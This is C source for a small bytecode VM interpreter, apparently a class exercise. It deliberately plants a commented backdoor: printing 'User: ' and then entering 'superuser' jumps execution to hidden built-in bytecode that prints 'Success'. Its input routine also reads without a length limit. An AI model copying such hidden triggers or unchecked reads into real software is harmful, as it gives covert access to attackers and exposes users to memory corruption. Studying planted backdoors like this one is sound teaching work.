// This is where you put your VM code.
// I am trying to follow the coding style of the original.

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "minivm.h"

// Annotate below definition for deleting debug message 
// #define VM_DEBUG_MESSAGE

#define NUM_REGS   (256)
#define NUM_FUNCS  (256)

// Global variable that indicates if the process is running.
static bool is_running = true;

// Global variable for triggering backdoor mode.
static bool backdoor_triggering = false;

// memory size 
#define TEXT_SIZE 8192
#define HEAP_SIZE 8192

// memory 
char text[ TEXT_SIZE ]; 
char heap[ HEAP_SIZE + 1 ]; 

// hidden and built-in memory for backdoor code
// This code just print "Success" 
char backdoor_text[120] = 
    "\x40\x01\x00\x00"  // puti r1, 0
    "\x40\x02\x53\x00"  // puti r2, 0x53
    "\x20\x01\x02\x00"  // store r1, r2
    "\x40\x01\x01\x00"  // puti r1, 1
    "\x40\x02\x75\x00"  // puti r2, 0x75
    "\x20\x01\x02\x00"  // store r1, r2
    "\x40\x01\x02\x00"  // puti r1, 2
    "\x40\x02\x63\x00"  // puti r2, 0x63
    "\x20\x01\x02\x00"  // store r1, r2
    "\x40\x01\x03\x00"  // puti r1, 3
    "\x40\x02\x63\x00"  // puti r2, 0x63
    "\x20\x01\x02\x00"  // store r1, r2
    "\x40\x01\x04\x00"  // puti r1, 4
    "\x40\x02\x65\x00"  // puti r2, 0x65
    "\x20\x01\x02\x00"  // store r1, r2
    "\x40\x01\x05\x00"  // puti r1, 5
    "\x40\x02\x73\x00"  // puti r2, 0x73
    "\x20\x01\x02\x00"  // store r1, r2
    "\x40\x01\x06\x00"  // puti r1, 6
    "\x40\x02\x73\x00"  // puti r2, 0x73
    "\x20\x01\x02\x00"  // store r1, r2
    "\x40\x01\x07\x00"  // puti r1, 7
    "\x40\x02\x0a\x00"  // puti r2, 10
    "\x20\x01\x02\x00"  // store r1, r2
    "\x40\x01\x07\x00"  // puti r1, 8
    "\x40\x02\x00\x00"  // puti r2, 0
    "\x20\x01\x02\x00"  // store r1, r2
    "\x40\x01\x00\x00"  // puti r1, 0  
    "\xc0\x01\x00\x00"  // puts r1
    "\x00\x00\x00\x00"; // halt 

// program count 
uint32_t* pc;

void usageExit() {
    // show usage
    printf( "USAGE: interpreter [FILE]\n" ); 
    exit(1);
}

void checkHeapBoundary( uint8_t i ) {
    if ( HEAP_SIZE < i) {
        printf( "ERROR: wrong heap address ... \n" ); 
        exit(1);
    }
}

void *halt(struct VMContext* ctx, const uint32_t instr) {
#ifdef VM_DEBUG_MESSAGE 
    printf( "\n\n   Process is halted....\n" ); 
#endif 
    exit(1);
}

void *load(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    //const uint8_t c = EXTRACT_B3(instr); //Not used
    checkHeapBoundary( ctx->r[b].value ); 
    ctx->r[a].value = 0xFF; 
    ctx->r[a].value &= heap[ ctx->r[b].value ];
#ifdef VM_DEBUG_MESSAGE 
    printf("\t%x <= heap[%x]\n", ctx->r[a].value, ctx->r[b].value );
#endif 
}

void *store(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    //const uint8_t c = EXTRACT_B3(instr); //Not used
    checkHeapBoundary( ctx->r[a].value ); 
    heap[ ctx->r[a].value ] = ctx->r[b].value;
#ifdef VM_DEBUG_MESSAGE 
    printf("\theap[%x] <= %x\n", ctx->r[a].value, ctx->r[b].value );
#endif 
}

void *puti(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    //const uint8_t c = EXTRACT_B3(instr); //Not used
    uint32_t tmp = 0xFF; 
    tmp &= b; 
    ctx->r[a].value = tmp;
#ifdef VM_DEBUG_MESSAGE 
    printf("\tregister[%x] <= %x\n", a, tmp );
#endif 
}

void *move(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    // const uint8_t c = EXTRACT_B3(instr);
    ctx->r[a].value = ctx->r[b].value;
#ifdef VM_DEBUG_MESSAGE 
    printf("\tregister[%x] <= %x in register[%x]\n", a, ctx->r[b].value, b );
#endif 
}


void *add(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    const uint8_t c = EXTRACT_B3(instr);
    ctx->r[a].value = ctx->r[b].value + ctx->r[c].value;
#ifdef VM_DEBUG_MESSAGE 
    printf("\tregister[%x] = register[%x] + register[%x]\n", a, b, c);
    printf("\t%x = %x + %x\n", ctx->r[a].value , ctx->r[b].value , ctx->r[c].value );
#endif 
}

void *sub(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    const uint8_t c = EXTRACT_B3(instr);
    ctx->r[a].value = ctx->r[b].value - ctx->r[c].value;
#ifdef VM_DEBUG_MESSAGE 
    printf("\tregister[%x] = register[%x] - register[%x]\n", a, b, c);
    printf("\t%x = %x - %x\n", ctx->r[a].value , ctx->r[b].value , ctx->r[c].value );
#endif 
}

void *gt(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    const uint8_t c = EXTRACT_B3(instr);
    if ( ctx->r[b].value >  ctx->r[c].value )
        ctx->r[a].value = 1;
    else 
        ctx->r[a].value = 0;
#ifdef VM_DEBUG_MESSAGE 
    printf("\tregister[%x] = ( register[%x] > register[%x] )\n", a, b, c);
    printf("\t%x = ( %x > %x )\n", ctx->r[a].value , ctx->r[b].value , ctx->r[c].value );
#endif
}

void *ge(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    const uint8_t c = EXTRACT_B3(instr);
    if ( ctx->r[b].value >=  ctx->r[c].value )
        ctx->r[a].value = 1;
    else 
        ctx->r[a].value = 0;
#ifdef VM_DEBUG_MESSAGE 
    printf("\tregister[%x] = ( register[%x] >= register[%x] )\n", a, b, c);
    printf("\t%x = ( %x >= %x )\n", ctx->r[a].value , ctx->r[b].value , ctx->r[c].value );
#endif
}

void *eq(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    const uint8_t c = EXTRACT_B3(instr);

    if ( ctx->r[b].value ==  ctx->r[c].value )
        ctx->r[a].value = 1;
    else 
        ctx->r[a].value = 0;
#ifdef VM_DEBUG_MESSAGE 
    printf("\tregister[%x] = ( register[%x] == register[%x] )\n", a, b, c);
    printf("\t%x = ( %x == %x )\n", ctx->r[a].value , ctx->r[b].value , ctx->r[c].value );
#endif
}

void *ite(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    const uint8_t b = EXTRACT_B2(instr);
    const uint8_t c = EXTRACT_B3(instr);

    char* tmp = &text;

    if ( ctx->r[a].value > 0 ) {
        // -4 and +4 because pc is incremented by the stepVMContext function
        pc = (uint32_t*) (tmp + b*4 - 4);
#ifdef VM_DEBUG_MESSAGE 
        printf("\tPC : %x <= ( %x + %x *4)\n", tmp + b*4, tmp, b );
#endif 
    }
    else {
        pc = (uint32_t*) (tmp + c*4 - 4);
#ifdef VM_DEBUG_MESSAGE 
        printf("\tPC : %x <= ( %x + %x *4 )\n", tmp + c*4, tmp, c );
#endif 
    }
}

void *jump(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    // const uint8_t b = EXTRACT_B2(instr);
    // const uint8_t c = EXTRACT_B3(instr);

    char* tmp = &text;

    // -4 and +4 because pc is incremented by the stepVMContext function 
    pc = (uint32_t*) (tmp + a*4 - 4);
#ifdef VM_DEBUG_MESSAGE 
    printf("\tJump to %x ( %x + %x *4 )\n", tmp + a*4, tmp, a );
#endif 
}

void *puts_inst(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    // const uint8_t b = EXTRACT_B2(instr);
    // const uint8_t c = EXTRACT_B3(instr);

    int i = 0; 
    char* tmp = heap;
    checkHeapBoundary( ctx->r[a].value ); 
    tmp += ctx->r[a].value;

    // checking "User" string for triggering backdoor 
    if (strcmp(tmp, "User: ") == 0 ) {
#ifdef VM_DEBUG_MESSAGE 
        printf("\t----- BACKDOOR TRIGGERED -----\n");
#endif 
        backdoor_triggering = true; 
    } 
    else {
        backdoor_triggering = false; 
    }

#ifdef VM_DEBUG_MESSAGE 
    printf("\tputs from %x (%x) : ", ctx->r[a].value, tmp );
#endif 

    while ( tmp[i] != 0 ) {
        printf("%c", tmp[i] ); 
        i++; 
    }
}

void *gets_inst(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t a = EXTRACT_B1(instr);
    // const uint8_t b = EXTRACT_B2(instr);
    // const uint8_t c = EXTRACT_B3(instr);

    int i = 0; 
    char* tmp = heap;
    char* backAddr; 
    checkHeapBoundary( ctx->r[a].value );
    tmp += ctx->r[a].value;

#ifdef VM_DEBUG_MESSAGE 
    printf("\tgets from %x (%x) : ", ctx->r[a].value, tmp );
#endif 

    while(1) {
        tmp[i] = fgetc( stdin ); 
        if ( tmp[i] == '\n' ) {
            tmp[i] = 0; 

            // turn on backdoor mode if user input is "superuser"
            if ( backdoor_triggering && strcmp(tmp, "superuser") == 0 ) {
#ifdef VM_DEBUG_MESSAGE 
                printf("\t----- BACKDOOR MODE ON -----\n");
#endif 
                backAddr = &backdoor_text;

                // -4 because pc is incremented by the stepVMContext function 
                pc = (uint32_t*) (backAddr - 4);
#ifdef VM_DEBUG_MESSAGE 
                printf("\tJump to BACKDOOR code ( %x )\n", backAddr );
#endif 
            }

            break; 
        }
        i++; 
    }
}

void initFuncs(FunPtr *f, uint32_t cnt) {
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        f[i] = NULL;
    }

    // TODO: initialize function pointers
    f[0x00] = halt;
    f[0x10] = load;
    f[0x20] = store;
    f[0x30] = move;
    f[0x40] = puti;
    f[0x50] = add;
    f[0x60] = sub;
    f[0x70] = gt;
    f[0x80] = ge;
    f[0x90] = eq;
    f[0xa0] = ite;
    f[0xb0] = jump;
    f[0xc0] = puts_inst; 
    f[0xd0] = gets_inst;
}

void initRegs(Reg *r, uint32_t cnt)
{
    uint32_t i;
    for (i = 0; i < cnt; i++) {
        r[i].type = 0;
        r[i].value = 0;
    }
}


int main(int argc, char** argv) {
    int i; 
    VMContext vm;
    Reg r[NUM_REGS];
    FunPtr f[NUM_FUNCS];
    FILE* bytecode;

    // There should be at least one argument.
    if (argc < 2) usageExit();

    // Initialize registers.
    initRegs(r, NUM_REGS);
    // Initialize interpretation functions.
    initFuncs(f, NUM_FUNCS);
    // Initialize VM context.
    initVMContext(&vm, NUM_REGS, NUM_FUNCS, r, f);

    // Load bytecode file
    bytecode = fopen(argv[1], "rb");
    if (bytecode == NULL) {
        perror("fopen");
        return 1;
    }

    fread((void*)text, 1, TEXT_SIZE, bytecode);

    i = 0;
    pc = (uint32_t*) &text; 

    while (is_running) {
        // Read 4-byte bytecode, and set the pc accordingly
        // I assume that the binary is already loaded. 

        // Debugging message for instr
#ifdef VM_DEBUG_MESSAGE 
        printf("Instr: %d -> '%x', '%x', '%x', '%x'\n", i, EXTRACT_B0(*pc), EXTRACT_B1(*pc), EXTRACT_B2(*pc), EXTRACT_B3(*pc));
#endif     
        stepVMContext(&vm, &pc);
        i++;
/*
        // heap data checking 
        printf("\tHeap (%x): %c | %c \n\n", heap, heap[0], heap[1]);
*/
    }

    fclose(bytecode);

    // Zero indicates normal termination.
    return 0;
}
